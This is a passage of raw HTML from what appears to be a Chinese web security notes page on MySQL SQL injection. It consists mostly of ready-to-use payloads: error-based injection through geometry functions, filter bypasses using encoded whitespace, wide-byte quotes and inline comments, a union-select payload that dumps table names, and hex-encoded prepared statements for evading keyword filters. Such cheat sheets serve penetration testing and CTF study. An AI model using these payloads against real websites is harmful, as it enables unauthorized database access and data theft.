keyword" style="color:#00009f">multipoint</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">，</span><span class="token keyword" style="color:#00009f">polygon</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">，</span><span class="token keyword" style="color:#00009f">multipolygon</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">，</span><span class="token keyword" style="color:#00009f">linestring</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">，</span><span class="token keyword" style="color:#00009f">multilinestring</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> 几何函数报错</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">multipoint</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> version</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">b</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">7.</span><span class="token plain">有时候报错注入是可以根据列名把表名爆出来 </span><span class="token comment" style="color:#999988;font-style:italic"># 比如 1&#x27;||polygon(passwd)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="-2"><a href="#-2" class="hash-link" aria-label="Direct link to -2" title="Direct link to -2">​</a></h2>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="绕过方法">绕过方法<a href="#绕过方法" class="hash-link" aria-label="Direct link to 绕过方法" title="Direct link to 绕过方法">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="绕过空格">绕过空格<a href="#绕过空格" class="hash-link" aria-label="Direct link to 绕过空格" title="Direct link to 绕过空格">​</a></h3>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">%</span><span class="token number" style="color:#36acaa">20</span><span class="token plain">、</span><span class="token operator" style="color:#393A34">%</span><span class="token number" style="color:#36acaa">09</span><span class="token plain">、</span><span class="token operator" style="color:#393A34">%</span><span class="token number" style="color:#36acaa">0</span><span class="token plain">a、</span><span class="token operator" style="color:#393A34">%</span><span class="token number" style="color:#36acaa">0</span><span class="token plain">b、</span><span class="token operator" style="color:#393A34">%</span><span class="token number" style="color:#36acaa">0</span><span class="token plain">c、</span><span class="token operator" style="color:#393A34">%</span><span class="token number" style="color:#36acaa">0</span><span class="token plain">d、</span><span class="token operator" style="color:#393A34">%</span><span class="token plain">a0、</span><span class="token operator" style="color:#393A34">%</span><span class="token number" style="color:#36acaa">00</span><span class="token plain">、</span><span class="token comment" style="color:#999988;font-style:italic">/**/</span><span class="token plain">、 </span><span class="token comment" style="color:#999988;font-style:italic">/*!select*/</span><span class="token plain"> 、</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">、</span><span class="token comment" style="color:#999988;font-style:italic">--%0a（可以1-256都跑一遍）</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#其中%09需要php环境，%0a为\n  /!select/为mysql独有，当版本号小于等于50727时</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="绕过单引号">绕过单引号<a href="#绕过单引号" class="hash-link" aria-label="Direct link to 绕过单引号" title="Direct link to 绕过单引号">​</a></h3>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">\转义、宽字节</span><span class="token operator" style="color:#393A34">%</span><span class="token plain">df</span><span class="token operator" style="color:#393A34">%</span><span class="token number" style="color:#36acaa">27</span><span class="token plain">，</span><span class="token operator" style="color:#393A34">%</span><span class="token plain">bf</span><span class="token operator" style="color:#393A34">%</span><span class="token number" style="color:#36acaa">27</span><span class="token plain">、十六进制绕过</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="注释方法">注释方法<a href="#注释方法" class="hash-link" aria-label="Direct link to 注释方法" title="Direct link to 注释方法">​</a></h3>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">/**/</span><span class="token plain">、</span><span class="token comment" style="color:#999988;font-style:italic">--+、#、;%00、union /*!select*/（mysql独有）</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="information_schema绕过">information_schema绕过<a href="#information_schema绕过" class="hash-link" aria-label="Direct link to information_schema绕过" title="Direct link to information_schema绕过">​</a></h3>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> table_name </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> mysql</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">innodb_index_stats 表名</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> database_name </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> mysql</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">innodb_index_stats 库名</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> table_name </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> mysql</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">innodb_table_stats 表 名</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> database_name </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> mysql</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">innodb_table_stats 库名</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="过滤逗号">过滤逗号<a href="#过滤逗号" class="hash-link" aria-label="Direct link to 过滤逗号" title="Direct link to 过滤逗号">​</a></h3>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">imit </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">limit</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">offset</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">mid</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">str</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token function" style="color:#d73a49">mid</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;str&#x27;</span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">substr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;str&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">a </span><span class="token keyword" style="color:#00009f">join</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">b </span><span class="token keyword" style="color:#00009f">join</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">mid</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;123&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">//适用于for被过滤</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">mid</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;123&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token number" style="color:#36acaa">23</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">//适用于for被过滤</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">substring</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;abc&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> abc  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">substring</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;abc&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> bc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">这样我们通过ord ascii 函数即可进行判断，因为这两个函数返回第一个字符的ascii码</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="过滤注释符">过滤注释符<a href="#过滤注释符" class="hash-link" aria-label="Direct link to 过滤注释符" title="Direct link to 过滤注释符">​</a></h3>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">查表</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27;/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()/**/having/**/&#x27;</span><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27;/**/like/**/&#x27;</span><span class="token number" style="color:#36acaa">1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="绕过点绕过selectfrom等关键字绕过">绕过(点绕过)、select，from等关键字绕过<a href="#绕过点绕过selectfrom等关键字绕过" class="hash-link" aria-label="Direct link to 绕过(点绕过)、select，from等关键字绕过" title="Direct link to 绕过(点绕过)、select，from等关键字绕过">​</a></h3>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x73656c65637420757365722066726f6d206d7973716c2e75736572</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">into</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">@s</span><span class="token punctuation" style="color:#393A34">;</span><span class="token keyword" style="color:#00009f">prepare</span><span class="token plain"> a </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">@s</span><span class="token punctuation" style="color:#393A34">;</span><span class="token keyword" style="color:#00009f">EXECUTE</span><span class="token plain"> a</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">//0x736... =&gt;&#x27;select user from mysql.user&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">set</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">@a</span><span class="token plain"> concat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;select user from mysql&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token keyword" style="color:#00009f">char</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">46</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;user&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token keyword" style="color:#00009f">prepare</span><span class="token plain"> a </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">@s</span><span class="token punctuation" style="color:#393A34">;</span><span class="token keyword" style="color:#00009f">EXECUTE</span><span class="token plain"> a</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">set</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">@a</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span><span class="token punctuation" style="color:#393A34">;</span><span class="token keyword" style="color:#00009f">prepare</span><span class="token plain"> b </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">@a</span><span class="token punctuation" style="color:#393A34">;</span><span class="token keyword" style="color:#00009f">execute</span><span class="token plain"> b</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="handler读取数据">handler读取数据<a href="#handler读取数据" class="hash-link" aria-label="Direct link to handler读取数据" title="Direct link to handler读取数据">​</a></h3>
<p>语法结构</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">HANDLER</span><span class="token plain"> tbl_name </span><span class="token keyword" style="color:#00009f">OPEN</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token keyword" style="color:#00009f">AS</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> alias</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">HANDLER</span><span class="token plain"> tbl_name </span><span class="token keyword" style="color:#00009f">READ</span><span class="token plain"> index_name { </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> } </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">value1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">value2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> where_condition </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token keyword" style="color:#00009f">LIMIT</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">HANDLER</span><span class="token plain"> tbl_name </span><span class="token keyword" style="color:#00009f">READ</span><span class="token plain"> index_name { </span><span class="token keyword" style="color:#00009f">FIRST</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">NEXT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">PREV</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">LAST</span><span class="token plain"> }</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> where_condition </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token keyword" style="color:#00009f">LIMIT</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">HANDLER</span><span class="token plain"> tbl_name </span><span class="token keyword" style="color:#00009f">READ</span><span class="token plain"> { </span><span class="token keyword" style="color:#00009f">FIRST</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">NEXT</span><span class="token plain"> }</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> where_condition </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token keyword" style="color:#00009f">LIMIT</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">HANDLER</span><span class="token plain"> tbl_name </span><span class="token keyword" style="color:#00009f">CLOSE</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 